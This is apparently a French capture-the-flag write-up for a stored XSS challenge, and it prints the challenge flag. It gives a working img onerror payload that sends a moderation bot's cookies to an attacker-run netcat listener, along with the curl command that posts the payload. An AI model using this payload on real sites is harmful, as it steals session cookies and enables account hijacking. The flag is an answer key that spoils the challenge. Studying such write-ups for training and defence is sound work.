# XSS injection 1

flag: `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

---

Un bot de moderation lit les nouveaux commentaires.
Les commentaire peuvent inclure du HTML pour le style.

Commentaire du code source: httpOnly est desactive.

On va essayer de poster un message avec un payload pour que le bot le lise
Pour le payload on utilise une balise `img` + un event handler (plutot que simplement `<script>` ).
Comme le payload est du html on peut utiliser `&quot;` pour ecrire certaines quotes.

Le payload va simplement faire un GET sur un listener (avec `netcat`) qu'on lancera nous. Dans la
query-string de la requete on affichera les cookies (du bot).


```shell
# listen with netcat
nc_port=9771
nc -l 0.0.0.0 "$nc_port"

# forum thread id
thread_id=bbeo32ucx0a65b8

# ip a
host='192.168.122.1'

# payload to listener
payload="<img src=z onerror='fetch(&quot;http://$host:$nc_port/?want=&quot;+encodeURIComponent(document.cookie))'>"

curl -s "http://$target/forum/$thread_id/comment' \
  -b cookies_jdoe.txt \
  --data-urlencode "content=$payload"
```
